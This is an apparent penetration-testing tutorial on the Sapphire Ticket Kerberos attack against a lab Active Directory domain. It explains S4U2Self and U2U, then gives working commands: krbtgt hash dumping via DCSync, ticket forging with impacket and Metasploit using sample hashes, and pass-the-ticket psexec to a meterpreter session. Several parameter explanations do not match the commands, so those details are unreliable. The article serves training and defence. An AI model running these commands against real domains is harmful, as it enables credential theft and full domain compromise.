@@ -1,0 +1,229 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Sapphire Ticket Attack: Abusing Kerberos Trust</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/sapphire-ticket-attack-abusing-kerberos-trust/" rel="bookmark"><time class="entry-date published" datetime="2025-04-13T10:12:16+00:00">April 13, 2025</time><time class="updated" datetime="2025-06-19T13:22:59+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p data-start="107" data-end="542"><span style="color: #000000">Sapphire Ticket attacks are an advanced form of Kerberos exploitation within Active Directory environments<strong data-start="107" data-end="218">.</strong> As the use of AD continues to grow, attackers are constantly evolving their techniques to bypass authentication systems. For instance<strong data-start="340" data-end="357">,</strong> recent developments in this space include both Diamond Ticket and Sapphire Ticket attacks, each allowing adversaries to gain unauthorized access to protected resources in an AD domain.</span></p>
+<p data-start="544" data-end="688"><span style="color: #000000">The Diamond Ticket attack has been well explained in the article <em data-start="623" data-end="672">“Diamond Ticket Attack: Abusing Kerberos Trust”</em> by Komal Singh.</span></p>
+<p data-start="690" data-end="1032"><span style="color: #000000">In comparison<strong data-start="690" data-end="708">,</strong> Sapphire Tickets are the evolution of Diamond Tickets, but stealthier. These are legitimate tickets; however, while the Diamond Ticket modifies the PAC, the Sapphire Ticket instead replaces it with the PAC of another privileged user. In this article<strong data-start="947" data-end="967">,</strong> we are going to deep dive into how Sapphire Ticket attacks work.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<p><strong><span style="color: #000000">Sapphire Ticket</span></strong></p>
+<p><strong><span style="color: #000000">Technical Terminology</span></strong></p>
+<p><strong><span style="color: #000000">Lab Setup</span></strong></p>
+<p><strong><span style="color: #000000">Exploitation Phase – Sapphire Ticket Attack</span></strong></p>
+<p><span style="color: #000000"><strong>Method for Exploitation</strong> </span></p>
+<ul>
+<li><span style="color: #000000">impacket</span></li>
+<li><span style="color: #000000">nxc</span></li>
+<li><span style="color: #000000">metasploit</span></li>
+</ul>
+<p><span style="color: #000000">   Conclusion</span></p>
+<h3><span style="color: #800000">Introduction – Sapphire Ticket </span></h3>
+<p><span style="color: #000000">A Sapphire ticket functions similarly to a Diamond ticket, as it obtains a legitimate TGT and then copies data from its PAC into the forged ticket. However, the key difference lies in an additional step: instead of relying on the PAC from the initial authentication, the attacker performs a separate process to acquire a PAC for another user—typically one with elevated privileges.</span></p>
+<p><span style="color: #000000">This process involves:</span></p>
+<ul>
+<li><span style="color: #000000">Authenticating with the KDC</span></li>
+<li><span style="color: #000000">By leveraging the S4U2Self and U2U extensions, the attacker requests a TGS for a high-privilege user. As a result, the system produces a PAC that reflects the real user’s authorization data, even though the resulting ticket cannot be used directly in privileged contexts.</span></li>
+<li><span style="color: #000000">Decrypting the PAC data</span></li>
+<li><span style="color: #000000">Modifying the forged PAC to match the attributes of the valid TGT</span></li>
+<li><span style="color: #000000">Encrypting the forged ticket using the krbtgt hash</span></li>
+</ul>
+<p><span style="color: #000000">As with Golden and Diamond tickets, attackers must possess the domain’s krbtgt hash to create a Sapphire ticket. However, unlike those tickets, they do not need theDOMAIN_SID andDOMAIN_RID—they instead extract this information directly from the valid TGT.</span></p>
+<h4><span style="color: #000000">Important technical terminology</span></h4>
+<p><span style="color: #000000"><strong>S4U2Self (Service for User to Self)</strong></span></p>
+<p><span style="color: #000000">The S4U2Self Kerberos extension allows a service to request a service to act on behalf of a user by requesting a service ticket for itself. This ticket includes the user’s authorization data—namely, the Privilege Attribute Certificate (PAC)—which the system then uses to make access control decisions.<br/>
+</span></p>
+<p><span style="color: #000000">To use S4U2Self, the requesting user must have at least one registered Service Principal Name (SPN). This SPN enables the Domain Controller (DC) to encrypt the generated service ticket with the service’s secret key.</span></p>
+<p><strong><span style="color: #000000">S4U2Self Ticket Request Flow:</span></strong></p>
+<ol>
+<li><span style="color: #000000">The service constructs the PA_FOR_USER data structure, specifying the user it wants to impersonate.</span></li>
+<li><span style="color: #000000">It sends a KRB_TGS_REQ message to the Ticket Granting Service (TGS).</span></li>
+<li><span style="color: #000000">The TGS responds with a service ticket containing the user’s PAC, encrypted for the requesting service.</span></li>
+</ol>
+<h4><span style="color: #000000">U2U (User-to-User Authentication)</span></h4>
+<p><span style="color: #000000">User-to-User (U2U) authentication is a Kerberos mechanism that enables a client to request a ticket encrypted with the session key of another user’s Ticket Granting Ticket (TGT)—typically when the server is a user and does not have a long-term key (like on a desktop machine).</span></p>
+<p><span style="color: #000000">U2U Ticket Request Features:</span></p>
+<p><span style="color: #000000">additional-tickets: Includes the TGT of the user acting as the server.</span></p>
+<p><span style="color: #000000">ENC-TKT-IN-SKEY: Instructs the KDC to encrypt the service ticket using the session key from the additional ticket.</span></p>
+<p><span style="color: #000000">The sname field (service name) can point to a user account instead of a traditional service with an SPN.</span></p>
+<p><span style="color: #000000">This allows one user (User B) to securely authenticate to another user (User A), even when User A doesn’t have a stored secret key.</span></p>
+<p><span style="color: #000000">U2U Flow Example:</span></p>
+<p><span style="color: #000000">User A (acting as a server) provides their TGT to User B.</span></p>
+<p><span style="color: #000000">User B sends a KRB_TGS_REQ to the KDC, including both User A’s and their own TGTs.</span></p>
+<p><span style="color: #000000">The KDC generates a new session key, encrypting it twice: once with User A’s session key and once with User B’s.</span></p>
+<p><span style="color: #000000">Both users decrypt their part, and now they share a common session key for secure communication.</span></p>
+<p><span style="color: #000000">This eliminates the need for User A to maintain a long-lived master key, making it safer to run services from less secure endpoints like desktops.</span></p>
+<h3><span style="color: #800000">Technical Details</span></h3>
+<p><span style="color: #000000">Sapphire Tickets leverage a combination of S4U2Self and U2U to bypass traditional SPN requirements.</span></p>
+<p><span style="color: #000000">Here’s how it works:</span></p>
+<ul>
+<li><span style="color: #000000">Normally, S4U2Self requires a valid SPN. But by using U2U in tandem, it becomes possible to request S4U2Self tickets without needing an SPN.</span></li>
+<li><span style="color: #000000">For example, a service configured for Kerberos Constrained Delegation (KCD) might receive an NTLM-authenticated user session. Without a Kerberos service ticket (ST) for the user, the service can’t delegate further.</span></li>
+<li><span style="color: #000000">In this case, the service sends a KRB_TGS_REQ for an ST for the user—to itself—via S4U2Self.</span></li>
+<li><span style="color: #000000">The resulting ticket includes the user’s PAC, which the service can decrypt using the krbtgt key.</span></li>
+<li><span style="color: #000000">Once it has the PAC, the service can inject or modify it in an existing TGT, re-encrypt it, and re-sign it with the krbtgt key.</span></li>
+</ul>
+<p><span style="color: #000000"><strong>In short:</strong></span></p>
+<p><span style="color: #000000">S4U2Self lets the service obtain a ticket on behalf of a user. U2U allows this process without requiring a service key. Combined, they offer a powerful way to impersonate users and manipulate Kerberos tickets.</span></p>
+<h4><span style="color: #000000">What’s the Difference Between a Diamond Ticket and a Sapphire Ticket Attack?</span></h4>
+<p><span style="color: #000000">In both attacks, the manipulation happens on the PAC of a legitimate TGT, but the main difference lies in the way it is modified. With a Diamond Ticket, the modification is to the original PAC of the requested TGT, either by adding additional privileges or modifying it completely. On the other hand, with a Sapphire Ticket, the attacker modifies the TGT by getting a legitimate PAC of a high-privileged user using Kerberos delegation and replacing it with the original ticket’s PAC.</span></p>
+<h3><span style="color: #800000">Lab setup</span></h3>
+<p><span style="color: #000000">To perform this attack, we will create two user admin1 as domain admin and rudra as Standard user in the Domain Controller. To perform this, we logon the domain controller and open command prompt and they the following command as shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user rudra Password@1 /add /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQuFEpZvxe_JEKoRQjE4w7kornu0Yz9dRCZvJt2HN90TuM6GfIaVZtW0phkPBp45u_wrUAcjHQFz0jYHCgeCh8SLnYoNVetI7-Jt8kn1iyU1ulkulPNSjjiGiNWyzrsl_4aGfWTzUQGXB-iNAsJ3LQwaJ5dvJx3qMqp0STsoKU6HTt0GJFRlfTBbuN85aW/s16000/1.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user admin1 Password@1 /add /domain
+net group “Domain Admins” admin1 /add /domain</pre>
+<p><span style="color: #000000"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEz1F4XkVEGkho2CfzXd-4tyIwWanQjDQstiTNMd46l04fMpy_0LIbNf9m1MMPXMXHahOx_Giet4tYsbv04RDSP-ljKlOF3gEg_cZ7kF46KiM2t2yflRaA9BRDyKlSHDe3092i5O94YkRyQzCdKO6352xdYuLpcZaCHqhfFoRWS0oVy1KHKf7Ac7e-Ruo4/s16000/2.png"/>                         </strong></span></p>
+<p><span style="color: #000000">Once the command executed, let verify if the user admin1 is really part of the domain admin group. To do so, we go in active directory users and computers – Users – double click on the selected user, in our case its, admin1, go to the Member of tab. You should see Domain Admins same as per screenshot below:</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrTZaqy5OJUxkWcX4JKzL2-im305IO54p-rqpExJLmMZYRi2NAYfwc1zkrEiO3c-r95x5cualV23IL5SlJOhaFWny8xCyD6bLg9FkEZeEhYS3DVt0JQVIbxP8eaq-Sn8nwRVnW56vgmqa3DZAmCI8vz5RRonWJTyrUvbOu3-dcWV_vQR8mmW0G5J_JOc7M/s16000/3.png"/></span></p>
+<h3><span style="color: #800000">Exploitation Phase – Sapphire Ticket Attack</span></h3>
+<h3><span style="color: #800000">Method of Exploitation</span></h3>
+<p><span style="color: #000000">As outlined above, to execute this attack, the attacker must obtain the KRBTGT hash. For example, in a hypothetical breach scenario, we assume the attacker has compromised the credentials of a privileged account, admin1-User. Consequently, leveraging this access, the attacker attempts to perform a DCSync attack to extract the KRBTGT account’s hash.</span></p>
+<h4><span style="color: #000000">Extracting KRBTGT hash &amp; Domain SID</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump 'ignite.local/admin1:Password@1@ignite.local -just-dc-user krbtgt</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlSFy5diKs3kR2HdKKLuQVa5ViM3hcoA5AEshxLGG7DJXw9XJLeUD3VHluVy-xgCbrIY7P7i8QQeG9ARiW90c0GlU8l1tIjMnp1jxMyyasgUPRHzRmXvXJKvYcSTO_GcTuwS2xiDrwe9lJpOY7EngAmI7h_Y71wFHv4L6FHRpP2EBDeKyUjham_EeC3dGi/s16000/4.png"/></span></p>
+<p><span style="color: #000000">The image below shows the NTLM and AES hashes for KRBTGT service account.</span></p>
+<p><span style="color: #000000">Followed by the next step, enumerate the SID for User admin1.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u admin1 -p Password@1 --get-sid</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwRIoCnoRku4fevhzWhabw-VuTW_BuZ9BmLMlIA9D40f9qX6WhSynIpWypGRKzmUbIK7EEKGNC_cM7tFviW6nt2Vm8OpnpHUO-Cg2Hfq-ahhXZONy5VIvVn7rbIcDWHjoB_2jHnv6e1WGqADxIYjlJ0L7JSJ8VQsDrBgOBhRuJWLJaBrMwvh90KUGmYEBz/s16000/5.png"/></span></p>
+<h4><span style="color: #000000">Generating forge TGS &amp; PAC</span></h4>
+<p><span style="color: #000000">The attacker forges a Service Ticket for user “admin1” with potentially elevated privileges and a valid signature, bypassing detection mechanisms such as PAC validation by the Domain Controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ticketer -request -impersonate admin1 -domain ignite.local -user rudra -password Password@1 -nthash 761688de884aff3372f8b9c53b2993c7 -aeskey '8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb' -domain-sid S-1-5-21-798084426-3415456680-3274829403 baduser</pre>
+<p><span style="color: #000000"><strong>-domain ‘ignite.local’:</strong> Specifies the target domain for the attack.</span></p>
+<p><span style="color: #000000"><strong>-user ‘admin1’:</strong> The username for whom the forged ticket is being generated.</span></p>
+<p><span style="color: #000000"><strong>-password ‘Password@1’:</strong> The user’s password to derive cryptographic keys for generating the PAC or ticket (not common in Silver Ticket attacks).</span></p>
+<p><span style="color: #000000"><strong>-nthash and -aesKey:</strong></span></p>
+<p><span style="color: #000000">The nthash and aesKey belong to the KRBTGT account, as required in a Diamond Ticket attack.</span></p>
+<p><span style="color: #000000">These are used to cryptographically sign and validate the forged service ticket.</span></p>
+<p><span style="color: #000000"><strong>-domain-sid</strong> ‘S-1-5-21-798084426-3415456680-3274829403’:</span></p>
+<p><span style="color: #000000">The domain SID is needed to construct the PAC, including user privileges and group memberships.</span></p>
+<p><span style="color: #000000"><strong>Admin1:</strong> Indicates the SPN (Service Principal Name) or username the attacker is impersonating, forging access to services as “baduser.”</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikFTYzPjE3NkZbGToTZW1wZTZXizQPYxJKeSmfmbj83Cd205-FrD5KKDsiM2RarTWZrAHJe0ApranW9VHZZHXjj_qkS1BwltAhpa473pn5-SqdxJvoqiyWysYI7w5IPtWqj9sFbKcBl-STjU_45HBKJRbBWpafy5Rkhyphenhyphenn-n8pSalPvLEqNsB2BYABj5eBy/s16000/6.png"/></span></p>
+<h4><span style="color: #000000">Pass the Ticket</span></h4>
+<p><span style="color: #000000">This environment variable tells the system to use a specific Kerberos credential cache file (baduser.ccache) for authentication.</span></p>
+<p><span style="color: #000000">The baduser.ccache file contains Kerberos tickets for the user “baduser,” likely including a Service Ticket (TGS) for the targeted resource. Therefore, it can be used to authenticate and access the service as the “baduser.”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=baduser.ccache
+impacket-psexec ignite.local/admin1@dc.ignite.local -dc-ip 192.168.1.48 -target-ip 192.168.1.48 -k -no-pass</pre>
+<p><span style="color: #000000"><strong>impacket-psexec:</strong>A tool from the Impacket library that uses SMB to execute commands remotely on Windows systems.</span></p>
+<p><span style="color: #000000"><strong>ignite.local/baduser@dc.ignite.local:</strong>The <strong>Kerberos principal name</strong> (user@realm) used for authentication:</span></p>
+<ul>
+<li><span style="color: #000000">local is the domain.</span></li>
+<li><span style="color: #000000">baduser is the username.</span></li>
+<li><span style="color: #000000">local is the hostname of the Domain Controller.</span></li>
+</ul>
+<p><span style="color: #000000"><strong>-dc-ip 192.168.1.48:</strong></span></p>
+<p><span style="color: #000000">Specifies the IP address of the Domain Controller (192.168.1.48).</span></p>
+<p><span style="color: #000000"><strong>-target-ip 192.168.1.48:</strong></span></p>
+<p><span style="color: #000000">The target system’s IP address where the command will be executed. Here, it is the same as the Domain Controller.</span></p>
+<p><span style="color: #000000"> <strong>-k:</strong></span></p>
+<p><span style="color: #000000">Indicates that Kerberos authentication will be used instead of NTLM. The tool fetches the Kerberos tickets from the specified credential cache (KRB5CCNAME).</span></p>
+<p><span style="color: #000000"><strong>no-pass:</strong></span></p>
+<p><span style="color: #000000">Tells the tool not to prompt for a password, as the authentication will be performed using the Kerberos tickets in the cache.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUinC21mrCH5umaFCRT1q4NvBY6qzwDUdTBCCSlnypLaKoRG3Rz9jDjL-BWuSfwB_yH_Llw-j8OJg6YjjhHHqGV_Fv2zt8E_TXCyP47MIz_Mn0Byk6TPHszb8ZTvdBdlPSndmOk0Ng5S1XieA38R0cra8GubNJVsywlYPjqbt2TTiiFdjFKsIfMUSf3ngn/s16000/7.png"/></span></p>
+<h3><span style="color: #800000">Metasploit</span></h3>
+<p><span style="color: #000000">This technique dumps SAM hashes and LSA secrets (including cached creds) from the remote Windows target without executing any agent locally. In particular, this is done by remotely updating the registry key security descriptor, taking advantage of the WriteDACL privileges held by local administrators to set temporary read permissions.</span></p>
+<p><span style="color: #000000">The details are as follows:</span></p>
+<h5><strong><span style="color: #000000">Target Setup:</span></strong></h5>
+<ul>
+<li><span style="color: #000000">RHOSTS = 192.168.1.48 (target machine, the domain controller)</span></li>
+<li><span style="color: #000000">SMBDOMAIN = ignite.local (domain)</span></li>
+<li><span style="color: #000000">SMBUSER = admin1</span></li>
+<li><span style="color: #000000">SMBPASS = Password@1</span></li>
+<li><span style="color: #000000">KRB_USERS = krbtgt (Kerberos ticket-granting user)</span></li>
+<li><span style="color: #000000">ACTION = DOMAIN (indicates domain secrets are being dumped)</span></li>
+</ul>
+<h5><strong><span style="color: #000000">Execution:</span></strong></h5>
+<ul>
+<li><span style="color: #000000">The module is run, and secrets are dumped using the DRSUAPI method (commonly used for grabbing NTDS.DIT data).</span></li>
+</ul>
+<h5><strong><span style="color: #000000">Output Highlights:</span></strong></h5>
+<ul>
+<li><span style="color: #000000"><strong>NTLM hash</strong> of krbtgt: 761688de884aff3372f8b9c53b2993c7</span></li>
+<li><span style="color: #000000"><strong>Kerberos AES Key</strong> for krbtgt:</span><br/>
+<span style="color: #000000">8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb</span></li>
+<li><span style="color: #000000">This data is crucial for forging tickets because the KRBTGT keys are used to sign valid Kerberos tickets.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use gather/windows_secrets_dump
+set RHOSTS 192.168.1.48
+set SMBDOMAIN ignite.local
+set SMBUSER admin1
+set SMBPASS Password@1
+set ACTION DOMAIN
+set KRB_USERS KRBTGT
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheBYFAHLjZwOIa-HCtrxuRAl_-v7RIXIAs6rdQxcBiSv1e4cF5ONRI6cnAqGd_6Eduy_8quHCPbEaJaYmPgY4w9rDFfxOrHZdziUWrAAYAAZXb7Bu_VZz2rZ4TS234curuKaecCng3flBjYCKJeLqVW6o9cFzAWQpDRgmPcqfcDvzjZIB_rzBkwKwKHvCA/s16000/15.png"/></span></p>
+<h4><span style="color: #000000">Metasploit: Forging Ticket (Sapphire Ticket Attack)</span></h4>
+<p><span style="color: #000000">This module actively forges a Kerberos ticket using four distinct techniques. In the Silver Ticket method, the attacker uses a service account hash to craft a ticket that impersonates any user and grants privileges to that account. In the Golden Ticket method, the attacker employs the <code data-start="1125" data-end="1133">krbtgt</code> hash to forge a ticket impersonating any user with any privileges. Next, the Diamond Ticket technique involves authenticating to the domain controller and then using the <code data-start="1304" data-end="1312">krbtgt</code> hash to copy the PAC from the authenticated user into a forged ticket. Finally, the Sapphire Ticket method uses the S4U2Self and U2U trick to retrieve the PAC of another user, and then the attacker utilizes the krbtgt hash to construct the forged ticket.</span></p>
+<p><span style="color: #000000">You’re using the Metasploit module forge_ticket to create a forged Kerberos ticket.</span></p>
+<h5><span style="color: #000000"><strong>Key Steps:</strong></span></h5>
+<ol>
+<li><span style="color: #000000"><strong>Set Up Forgery Parameters</strong>:</span>
+<ul>
+<li><span style="color: #000000">AES_KEY = krbtgt AES key from previous step.</span></li>
+<li><span style="color: #000000">USER = admin1 (impersonated user)</span></li>
+<li><span style="color: #000000">REQUEST_USER = rudra (user requesting the ticket)</span></li>
+<li><span style="color: #000000">REQUEST_PASSWORD = Password@1 (used in U2U process)</span></li>
+<li><span style="color: #000000">DOMAIN = ignite.local</span></li>
+<li><span style="color: #000000">RHOSTS = 192.168.1.48 (target machine)</span></li>
+</ul>
+</li>
+<li><span style="color: #000000"><strong>Run the Module</strong>:</span>
+<ul>
+<li><span style="color: #000000">A <strong>TGT (Ticket Granting Ticket)</strong> and <strong>TGS (Ticket Granting Service)</strong> response is received.</span></li>
+<li><span style="color: #000000">Ticket is saved to:</span><br/>
+<span style="color: #000000">/root/.msf4/loot/20250128100342_default_192.168.1.48_mit.kerberos.cca_038047.bin</span></li>
+</ul>
+</li>
+</ol>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use admin/kerberos/forge_ticket
+set action FORGE_SAPPHIRE
+set AES_KEY 8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb
+set USER admin1
+set DOMAIN ignite.local
+set REQUEST_USER rudra
+set REQUEST_PASSWORD Password@1
+set RHOSTS 192.168.1.48
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMRNI_z8SfxSeeP6f4INwx1EH8zIXKwzHVSRzAIospulLRCUjquPPRhR01Gdc7F5G2As2FFyaEhSLB0Yz7L-g_D-D1du_UNwdqqQMQH7rTuETzSEA1ytEGBULo0CDMaWpRXvxZKKROIKIrO4Q7nMIx0_69q1h5OGJC8j4Ex_fJMtkn9RIojqR225E7WrE5/s16000/16.png"/></span></p>
+<p><span style="color: #000000">Use ls command to list all the files as shown above. Then we rename the file to.1.bin by using the mv command which makes it easier for future user.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6vG8mMkqljhnHkngyztkKftskj0TIAVRNtrxG8OjvNGQz9-F5JQ5CSovIernT3T_nTLSL60yUY6rAO42dHgxgRGKkwR6wl1AEJOiUinXgw-uv3Lk_ISpTrQXtFAoeXlKcih-UZSWuUBVM6dUMPPVAKbl0VQwnlES3rQ7xsPIm0sSIyZRzhnqiYNSct1Hg/s16000/17.png"/></span></p>
+<p><span style="color: #000000">This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload<strong data-start="73" data-end="189">.</strong> Moreover, this module is similar to the “psexec” utility provided by SysInternals. Furthermore, this module is now able to clean up after itself. Additionally, the service created by this tool uses a randomly chosen name and description.</span></p>
+<p><span style="color: #000000">Target setting:</span></p>
+<ul>
+<li><span style="color: #000000">Set RHOST 192.168.1.48 – rhost is set to the target machine</span></li>
+<li><span style="color: #000000">SMBDOMAIN: ignite.local</span></li>
+<li><span style="color: #000000">USERNAME: admin1</span></li>
+<li><span style="color: #000000">SMB::AUTH:set to Kerberos</span></li>
+<li><span style="color: #000000">SMB::KRB5CCNAME: Kerberos ticket cache provided from /root/.msf4/loot/1.bin</span></li>
+<li><span style="color: #000000">SMB::RHOSTNAME:dc.ignite.local (hostname of the DC)</span></li>
+<li><span style="color: #000000">DOMAINCONTOLLERHOST: explicitly set to 192.168.1.48</span></li>
+<li><span style="color: #000000">LHOST: attacker’s machine: 192.168.1.60</span></li>
+<li><span style="color: #000000">Type run and hit enter to execute the payload and open a meterpreter session.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.48
+set SMBDOMAIN ignite.local
+set USERNAME admin1
+set SMB::AUTH kerberos
+set SMB::KRB5CCNAME /root/.msf4/loot/1.bin
+set SMB::RHOSTNAME dc.ignite.local
+set DOMAINCONTROLLERRHOST 192.168.1.48
+set LHOST 192.168.1.60</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAoGqO_kop_bTR62vwhzHN4kmk83g-7FT0IyKLErtYw5SbZeZtAR1VUGkTQ8K1GSlHKJcwxk-OEJ25R7Ve-5WV_k07iyl_5jn8hMG_e7cx3t3QBgShtdB6vKdMJdcsCNGoS4KxevByZ3mmBHfZRIHcQ48HK2TQ1K7wHodhFoHtKhrUfByAuqvYxdxytqXG/s16000/18.png"/></span></p>
+<h3><span style="color: #800000">Conclusion</span></h3>
+<p><span style="color: #000000">The Sapphire Tickets Attack technique is a powerful method for manipulating Kerberos authentication by combining the S4U2Self and User-to-User (U2U) protocol extensions. Specifically, it allows an attacker or service to impersonate a user and retrieve their authorization data (PAC) without needing a Service Principal Name (SPN) or long-term service key. After successfully retrieving the PAC, the attacker can inject it into a forged ticket. Consequently, this enables privilege escalation or lateral movement across the domain.<br/>
+</span></p>
+<p><span style="color: #000000">Ultimately, this technique highlights how attackers can abuse legitimate Kerberos features—originally designed to support flexible delegation and secure peer-to-peer authentication—when domain security lacks proper configuration and control. It underscores the importance of:</span></p>
+<ul>
+<li><span style="color: #000000">Monitoring ticket behavior and unusual delegation requests,</span></li>
+<li><span style="color: #000000">Securing and auditing KCD configurations,</span></li>
+<li><span style="color: #000000">Minimizing use of NTLM and ensuring strong service principal hygiene.</span></li>
+</ul>
+<p><span style="color: #000000">In short, Sapphire Tickets turn trust-based Kerberos mechanisms into potential vectors for stealthy attacks—making awareness and detection crucial in modern Active Directory environments.</span></p>
+<p><span style="color: #000000"><strong>Author</strong>: Tirut Hawoldar is a Cyber Security Enthusiast and CTF player with 15 years of experience in IT Security and Infrastructure. Can be Contacted on</span> <a href="https://www.linkedin.com/in/tirut-hawoldar-72b67214/"><strong>LinkedIn</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
